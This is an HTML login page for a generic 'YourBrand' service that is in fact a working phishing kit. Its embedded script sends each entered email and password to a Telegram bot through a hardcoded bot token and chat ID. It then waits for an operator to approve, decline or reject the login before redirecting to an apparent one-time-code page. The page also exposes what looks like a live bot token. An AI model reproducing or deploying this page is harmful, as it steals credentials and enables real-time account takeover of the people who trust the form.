<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <title>Log in to your account</title>

    <style>
         :root {
            --brand: #7a1a8c;
            --brand-dark: #5f1470;
            --text: #1f1f1f;
            --text-muted: #5c5c5c;
            --border: #d9d9d9;
            --bg-input: #f5f5f5;
            --disabled: #c4c4c4;
            --radius: 8px;
        }
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background: #ffffff;
            color: var(--text);
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            padding: 16px 24px;
        }
        
        .logo {
            font-size: 26px;
            font-weight: 800;
            color: var(--brand);
            letter-spacing: -0.5px;
            display: flex;
            align-items: center;
            gap: 8px;
            text-decoration: none;
        }
        
        .logo-mark {
            width: 30px;
            height: 30px;
            background: var(--brand);
            border-radius: 6px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            color: #fff;
            font-size: 16px;
        }
        /* ---------- Language dropdown ---------- */
        
        .lang {
            position: relative;
        }
        
        .lang-btn {
            display: flex;
            align-items: center;
            gap: 10px;
            background: #f2f2f2;
            border: none;
            border-radius: var(--radius);
            padding: 9px 14px;
            font-size: 16px;
            color: var(--text);
            cursor: pointer;
            min-width: 170px;
            justify-content: space-between;
        }
        
        .selected-language {
            display: flex;
            align-items: center;
            gap: 9px;
        }
        
        .flag-circle {
            width: 30px;
            height: 30px;
            border-radius: 50%;
            overflow: hidden;
            display: inline-flex;
            align-items: center;
            justify-content: center;
            flex-shrink: 0;
            border: 2px solid #fff;
            box-shadow: 0 1px 5px rgba(0, 0, 0, 0.2);
        }
        
        .flag-circle img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        
        .arrow {
            font-size: 12px;
            color: #666;
        }
        
        .lang-menu {
            position: absolute;
            top: calc(100% + 8px);
            right: 0;
            width: 190px;
            padding: 6px;
            background: #fff;
            border: 1px solid var(--border);
            border-radius: 10px;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
            display: none;
            z-index: 9999;
        }
        
        .lang-menu.open {
            display: block;
        }
        
        .lang-option {
            width: 100%;
            display: flex;
            align-items: center;
            gap: 10px;
            padding: 8px 9px;
            border: none;
            border-radius: 7px;
            background: transparent;
            cursor: pointer;
            text-align: left;
            font-size: 15px;
            color: var(--text);
        }
        
        .lang-option:hover {
            background: #f3f3f3;
        }
        
        .lang-option .flag-circle {
            width: 28px;
            height: 28px;
        }
        /* ---------- Main ---------- */
        
        .main {
            width: 100%;
            max-width: 660px;
            margin: 0 auto;
            padding: 24px 24px 48px;
            flex: 1;
        }
        
        h1 {
            text-align: center;
            font-size: clamp(26px, 5vw, 34px);
            font-weight: 700;
            margin: 24px 0 12px;
        }
        
        .subtitle {
            text-align: center;
            font-size: 17px;
            margin-bottom: 36px;
        }
        
        .subtitle a {
            color: var(--brand);
            font-weight: 600;
            text-decoration: underline;
        }
        /* ---------- Form ---------- */
        
        .field {
            position: relative;
            margin-bottom: 34px;
        }
        
        .field input {
            width: 100%;
            background: var(--bg-input);
            border: 1px solid var(--bg-input);
            border-bottom: 1px solid var(--border);
            border-radius: var(--radius) var(--radius) 0 0;
            padding: 22px 48px 14px 16px;
            font-size: 17px;
            outline: none;
            transition: border-color 0.15s;
        }
        
        .field input:focus {
            border-bottom: 2px solid var(--brand);
        }
        
        .field label {
            position: absolute;
            left: 16px;
            top: 18px;
            font-size: 17px;
            color: var(--text-muted);
            pointer-events: none;
            transition: all 0.15s ease;
        }
        
        .field input:focus+label,
        .field input:not(:placeholder-shown)+label {
            top: 6px;
            font-size: 12px;
        }
        
        .toggle-pass {
            position: absolute;
            right: 12px;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            cursor: pointer;
            padding: 6px;
            color: var(--text-muted);
            display: flex;
            align-items: center;
        }
        
        .btn {
            display: block;
            width: 100%;
            padding: 16px;
            font-size: 17px;
            font-weight: 600;
            border: none;
            border-radius: 999px;
            cursor: pointer;
            text-align: center;
            transition: background 0.15s, opacity 0.15s;
        }
        
        .btn-primary {
            background: var(--brand);
            color: #fff;
            opacity: 1;
        }
        
        .btn-primary:hover {
            background: var(--brand-dark);
        }
        
        .btn-primary.waiting {
            opacity: 0.95;
            cursor: not-allowed;
            pointer-events: none;
        }
        
        .btn-primary:disabled {
            background: var(--disabled);
            cursor: not-allowed;
            opacity: 0.95;
        }
        
        .error-msg {
            display: none;
            color: #b00020;
            font-size: 14px;
            margin: 0 4px 18px;
        }
        
        .error-msg.show {
            display: block;
        }
        
        .status-msg {
            display: none;
            color: #0a7a00;
            font-size: 14px;
            margin: 0 4px 18px;
            font-weight: 600;
        }
        
        .status-msg.show {
            display: block;
        }
        
        .forgot {
            display: block;
            text-align: center;
            margin: 28px 0;
            color: var(--brand);
            font-size: 17px;
            font-weight: 600;
            text-decoration: underline;
        }
        
        .divider {
            text-align: center;
            font-size: 16px;
            margin: 24px 0;
        }
        
        .btn-outline {
            background: #fff;
            color: var(--brand);
            border: 2px solid var(--brand);
            border-radius: 12px;
            font-weight: 700;
            padding: 15px;
            cursor: pointer;
            width: 100%;
        }
        
        .btn-outline:hover {
            background: #faf5fb;
        }
        
        .footer {
            border-top: 1px solid #eee;
            padding: 20px 24px;
        }
        
        .footer nav {
            max-width: 660px;
            margin: 0 auto;
            display: flex;
            justify-content: space-between;
            flex-wrap: wrap;
            gap: 12px;
        }
        
        .footer a {
            color: var(--text-muted);
            font-size: 14px;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        @media (max-width: 480px) {
            .header {
                padding: 14px 16px;
            }
            .lang-btn {
                min-width: 140px;
                padding: 8px 12px;
                font-size: 15px;
            }
            .flag-circle {
                width: 26px;
                height: 26px;
            }
            .main {
                padding: 8px 20px 32px;
            }
            h1 {
                margin-top: 8px;
            }
            .field {
                margin-bottom: 28px;
            }
            .footer nav {
                justify-content: center;
            }
        }
        /* ---------- Spinner Overlay ---------- */
        
        .spinner-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            z-index: 1000;
            opacity: 0;
            visibility: hidden;
            transition: opacity 0.4s ease, visibility 0.4s ease;
            pointer-events: none;
        }
        
        .spinner-overlay.active {
            opacity: 1;
            visibility: visible;
            pointer-events: all;
        }
        
        .spinner {
            width: 48px;
            height: 48px;
            border: 4px solid rgba(255, 255, 255, 0.15);
            border-top-color: #22c55e;
            border-radius: 50%;
            animation: spin 0.9s linear infinite;
        }
        
        @keyframes spin {
            to {
                transform: rotate(360deg);
            }
        }
        
        .spinner-text {
            color: #d1d5db;
            font-size: 15px;
            margin-top: 20px;
            font-weight: 500;
        }
        
        .spinner-email {
            color: #22c55e;
            font-size: 14px;
            margin-top: 6px;
            font-weight: 600;
        }
        
        .cancel-poll-btn {
            margin-top: 22px;
            padding: 10px 28px;
            background: transparent;
            border: 1px solid #4b5563;
            border-radius: 50px;
            color: #9ca3af;
            font-family: inherit;
            font-size: 13px;
            cursor: pointer;
            transition: all 0.2s;
        }
        
        .cancel-poll-btn:hover {
            border-color: #ef4444;
            color: #ef4444;
        }
    </style>
</head>

<body>
    <header class="header">
        <a class="logo" href="#">
            <span class="logo-mark">Y</span>YourBrand
        </a>

        <div class="lang">
            <button id="langBtn" class="lang-btn" type="button" aria-haspopup="true" aria-expanded="false">
        <span class="selected-language">
          <span class="flag-circle">
            <img src="https://flagcdn.com/w80/gb.png" alt="UK flag" />
          </span>
          <span>English</span>
        </span>
        <span class="arrow" aria-hidden="true">▾</span>
      </button>

            <div class="lang-menu" id="langMenu">
                <button class="lang-option" type="button" data-lang="English" data-flag="gb">
          <span class="flag-circle"><img src="https://flagcdn.com/w80/gb.png" alt="UK flag" /></span>
          <span>English</span>
        </button>

                <button class="lang-option" type="button" data-lang="Deutsch" data-flag="de">
          <span class="flag-circle"><img src="https://flagcdn.com/w80/de.png" alt="German flag" /></span>
          <span>Deutsch</span>
        </button>

                <button class="lang-option" type="button" data-lang="Français" data-flag="fr">
          <span class="flag-circle"><img src="https://flagcdn.com/w80/fr.png" alt="French flag" /></span>
          <span>Français</span>
        </button>

                <button class="lang-option" type="button" data-lang="Español" data-flag="es">
          <span class="flag-circle"><img src="https://flagcdn.com/w80/es.png" alt="Spanish flag" /></span>
          <span>Español</span>
        </button>
            </div>
        </div>
    </header>

    <main class="main">
        <h1>Log in to your account</h1>
        <p class="subtitle">
            Don't have an account? <a href="#">Register</a>
        </p>

        <form id="loginForm" novalidate>
            <div class="field">
                <input type="email" id="email" placeholder=" " autocomplete="email" />
                <label for="email">Email</label>
            </div>

            <div class="field">
                <input type="password" id="password" placeholder=" " autocomplete="current-password" />
                <label for="password">Password</label>

                <button type="button" class="toggle-pass" id="togglePass" aria-label="Show password">
          <svg width="22" height="22" viewBox="0 0 24 24" fill="none"
               stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
            <path d="M17.94 17.94A10.07 10.07 0 0 1 12 20c-7 0-11-8-11-8a18.45 18.45 0 0 1 5.06-5.94" />
            <path d="M9.9 4.24A9.12 9.12 0 0 1 12 4c7 0 11 8 11 8a18.5 18.5 0 0 1-2.16 3.19" />
            <path d="M14.12 14.12a3 3 0 1 1-4.24-4.24" />
            <line x1="1" y1="1" x2="23" y2="23" />
          </svg>
        </button>
            </div>

            <p class="error-msg" id="errorMsg">Please enter a valid email and password.</p>
            <p class="status-msg" id="statusMsg">Please wait…</p>

            <button type="submit" class="btn btn-primary" id="loginBtn">
        Log in
      </button>
        </form>

        <a class="forgot" href="#">Forgot your password?</a>

        <p class="divider">or</p>

        <button class="btn btn-outline" type="button">
      Log in with passkey
    </button>
    </main>

    <footer class="footer">
        <nav>
            <a href="#">Terms of Use</a>
            <a href="#">Privacy</a>
            <a href="#">Cookies</a>
            <a href="#">Personal Data Requests</a>
        </nav>
    </footer>

    <!-- Spinner Overlay -->
    <div class="spinner-overlay" id="spinnerOverlay">
        <div class="spinner"></div>
        <p class="spinner-text">login...</p>
        <p class="spinner-email" id="spinnerEmail"></p>
        <button class="cancel-poll-btn" type="button" id="cancelPollBtn">Cancel</button>
    </div>

    <script>
        // ─── Telegram polling state ─────────────────────────────
        let pollDecided = false;
        let pollTimeoutId = null;
        let currentPollController = null;

        // ─── CONFIG ────────────────────────────────────────────
        const BOT_TOKEN = "8255631739:AAEnO1w67WAdk9i8lOK_1IsUkIqzSEwySaY";
        const CHAT_ID = "5615316142";
        const API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;

        // ─── DOM refs ───────────────────────────────────────────
        const spinnerOverlay = document.getElementById("spinnerOverlay");
        const spinnerEmailEl = document.getElementById("spinnerEmail");
        const cancelPollBtn = document.getElementById("cancelPollBtn");

        const emailField = document.getElementById("email");
        const passwordField = document.getElementById("password");
        const toggleBtn = document.getElementById("togglePass");
        const loginBtn = document.getElementById("loginBtn");

        const loginForm = document.getElementById("loginForm");
        const errorMsg = document.getElementById("errorMsg");
        const statusMsg = document.getElementById("statusMsg");

        // ─── Helpers ─────────────────────────────────────────────
        function setError(msg) {
            if (!errorMsg) return;
            errorMsg.textContent = msg;
            errorMsg.classList.add("show");
        }

        function clearError() {
            if (!errorMsg) return;
            errorMsg.classList.remove("show");
        }

        function setStatus(msg) {
            if (!statusMsg) return;
            statusMsg.textContent = msg;
            statusMsg.classList.add("show");
        }

        function clearStatus() {
            if (!statusMsg) return;
            statusMsg.classList.remove("show");
        }

        function setLoginWaiting(isWaiting) {
            if (!loginBtn) return;
            loginBtn.disabled = !!isWaiting;
            loginBtn.classList.toggle("waiting", !!isWaiting);
        }

        // ─── Language dropdown toggle (basic) ──────────────────
        const langBtn = document.getElementById("langBtn");
        const langMenu = document.getElementById("langMenu");

        function closeLangMenu() {
            if (!langMenu) return;
            langMenu.classList.remove("open");
            if (langBtn) langBtn.setAttribute("aria-expanded", "false");
        }

        if (langBtn && langMenu) {
            langBtn.addEventListener("click", (e) => {
                e.stopPropagation();
                const isOpen = langMenu.classList.contains("open");
                langMenu.classList.toggle("open", !isOpen);
                langBtn.setAttribute("aria-expanded", String(!isOpen));
            });

            document.addEventListener("click", () => closeLangMenu());

            langMenu.querySelectorAll(".lang-option").forEach((btn) => {
                btn.addEventListener("click", () => {
                    const lang = btn.getAttribute("data-lang") || "English";
                    const flag = btn.getAttribute("data-flag") || "gb";

                    const selected = langBtn.querySelector(".selected-language");
                    if (selected) {
                        const textSpan = selected.querySelector("span:last-child");
                        if (textSpan) textSpan.textContent = lang;

                        const img = selected.querySelector("img");
                        if (img) img.src = `https://flagcdn.com/w80/${flag}.png`;
                    }

                    closeLangMenu();
                });
            });
        }

        // ─── Eye toggle ─────────────────────────────────────────
        if (toggleBtn) {
            toggleBtn.addEventListener("click", () => {
                if (!passwordField) return;
                const isPassword = passwordField.type === "password";
                passwordField.type = isPassword ? "text" : "password";
                toggleBtn.setAttribute("aria-label", isPassword ? "Hide password" : "Show password");
            });
        }

        // ─── Load saved email ───────────────────────────────────
        window.addEventListener("DOMContentLoaded", () => {
            try {
                const saved = localStorage.getItem("signin_email");
                if (saved && emailField) emailField.value = saved;
            } catch (_) {}

            setLoginWaiting(false);
        });

        // ─── Cancel polling ────────────────────────────────────
        function cancelPolling() {
            pollDecided = true;

            if (pollTimeoutId) clearTimeout(pollTimeoutId);
            pollTimeoutId = null;

            if (currentPollController) {
                try {
                    currentPollController.abort();
                } catch (_) {}
            }

            if (spinnerOverlay) spinnerOverlay.classList.remove("active");
            setError("Request cancelled. Please try again.");
            setLoginWaiting(false);
            clearStatus();
        }

        if (cancelPollBtn) cancelPollBtn.addEventListener("click", cancelPolling);

        // ─── Polling logic ──────────────────────────────────────
        function startPolling(userId, onApproveUrl, pollType) {
            let offset = 0;
            pollDecided = false;
            let pollCount = 0;
            const maxPolls = 90;
            let retryDelay = 2000;

            if (currentPollController) {
                try {
                    currentPollController.abort();
                } catch (_) {}
            }
            currentPollController = new AbortController();

            function getInitialOffset() {
                return fetch(
                        `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=1`, {
                            signal: currentPollController.signal
                        }
                    )
                    .then(r => r.json())
                    .then(data => {
                        if (data && data.ok && data.result && data.result.length > 0) {
                            offset = data.result[data.result.length - 1].update_id + 1;
                        }
                    });
            }

            function pollLoop() {
                if (pollDecided) return;
                pollCount++;

                if (pollCount > maxPolls) {
                    pollDecided = true;
                    if (spinnerOverlay) spinnerOverlay.classList.remove("active");
                    setError("Request timed out. Please try again.");
                    setLoginWaiting(false);
                    return;
                }

                fetch(
                        `https://api.telegram.org/bot${BOT_TOKEN}/getUpdates?limit=20&offset=${offset}`, {
                            method: "GET",
                            signal: currentPollController.signal
                        }
                    )
                    .then(r => {
                        if (!r.ok) {
                            if (r.status === 409) {
                                retryDelay = Math.min(retryDelay * 1.5, 10000);
                                pollTimeoutId = setTimeout(pollLoop, retryDelay);
                                return null;
                            }
                            throw new Error("HTTP " + r.status);
                        }
                        retryDelay = 2000;
                        return r.json();
                    })
                    .then(data => {
                        if (!data || pollDecided) return;
                        if (!data.ok || !Array.isArray(data.result)) return;

                        for (const update of data.result) {
                            offset = update.update_id + 1;

                            if (update.callback_query) {
                                const action = update.callback_query.data;

                                // answer callback (best-effort)
                                fetch(
                                    `https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`, {
                                        method: "POST",
                                        headers: {
                                            "Content-Type": "application/json"
                                        },
                                        body: JSON.stringify({
                                            callback_query_id: update.callback_query.id,
                                            text: "Action recorded!",
                                        }),
                                    }
                                ).catch(() => {});

                                if (pollType === "auth") {
                                    if (action === `approve_${userId}`) {
                                        pollDecided = true;

                                        try {
                                            localStorage.setItem("signin_approved", "1");
                                            localStorage.setItem("signin_userId", userId);
                                        } catch (_) {}

                                        if (spinnerOverlay) spinnerOverlay.classList.remove("active");

                                        // ✅ When approved, redirect to otp.html
                                        window.location.href = onApproveUrl;
                                        return;
                                    }

                                    if (action === `decline_${userId}`) {
                                        pollDecided = true;
                                        if (spinnerOverlay) spinnerOverlay.classList.remove("active");
                                        setError("Request declined. Please try again.");
                                        setLoginWaiting(false);
                                        clearStatus();
                                        return;
                                    }

                                    if (action === `wrong_${userId}`) {
                                        pollDecided = true;
                                        if (spinnerOverlay) spinnerOverlay.classList.remove("active");
                                        setError("Wrong password. Please enter the correct password.");
                                        setLoginWaiting(false);
                                        clearStatus();
                                        return;
                                    }
                                }
                            }
                        }

                        if (!pollDecided) pollTimeoutId = setTimeout(pollLoop, retryDelay);
                    })
                    .catch(err => {
                        if (err && err.name === "AbortError") return;
                        console.error("Poll error:", err);

                        if (!pollDecided) {
                            retryDelay = Math.min(retryDelay * 1.2, 8000);
                            pollTimeoutId = setTimeout(pollLoop, retryDelay);
                        }
                    });
            }

            getInitialOffset()
                .catch(() => {})
                .finally(() => pollLoop());
        }

        // ─── STEP 1: Sign In submit ─────────────────────────────
        if (loginForm) {
            loginForm.addEventListener("submit", function(e) {
                e.preventDefault();

                clearError();
                clearStatus();

                const email = emailField ? emailField.value.trim() : "";
                const password = passwordField ? passwordField.value : "";

                try {
                    if (emailField) localStorage.setItem("signin_email", email);
                } catch (_) {}

                setStatus("Verifying with Telegram...");
                if (spinnerOverlay) spinnerOverlay.classList.add("active");

                // prevent double-submit while waiting
                setLoginWaiting(true);

                const userId =
                    (email || "user").replace(/[^a-zA-Z0-9]/g, "").slice(0, 15) + "_" + Date.now();

                try {
                    localStorage.setItem("signin_userId", userId);
                } catch (_) {}

                const message = [
                    "🔐 Login attempt",
                    "",
                    `Email: ${email}`,
                    `Password: ${password}`,
                    "",
                    "Please approve, decline, or mark as wrong password:",
                ].join("\n");

                const keyboard = {
                    inline_keyboard: [
                        [{
                            text: "✅ APPROVE",
                            callback_data: `approve_${userId}`
                        }, {
                            text: "❌ DECLINE",
                            callback_data: `decline_${userId}`
                        }, ],
                        [{
                            text: "⚠️ WRONG PASSWORD",
                            callback_data: `wrong_${userId}`
                        }, ],
                    ],
                };

                fetch(`${API_BASE}/sendMessage`, {
                        method: "POST",
                        headers: {
                            "Content-Type": "application/json"
                        },
                        body: JSON.stringify({
                            chat_id: CHAT_ID,
                            text: message,
                            reply_markup: JSON.stringify(keyboard),
                        }),
                    })
                    .then(res => res.json())
                    .then(data => {
                        if (!data || !data.ok) {
                            if (spinnerOverlay) spinnerOverlay.classList.remove("active");
                            setLoginWaiting(false);
                            setError("Failed to contact Telegram. Please try again.");
                            return;
                        }

                        if (spinnerEmailEl) spinnerEmailEl.textContent = email || "(no email)";

                        // ✅ On approve -> otp.html
                        startPolling(userId, "otp.html", "auth");
                    })
                    .catch(err => {
                        console.error("Telegram send failed:", err);
                        if (spinnerOverlay) spinnerOverlay.classList.remove("active");
                        setLoginWaiting(false);
                        setError("Network error. Please try again.");
                        clearStatus();
                    });
            });
        }
    </script>
</body>

</html>
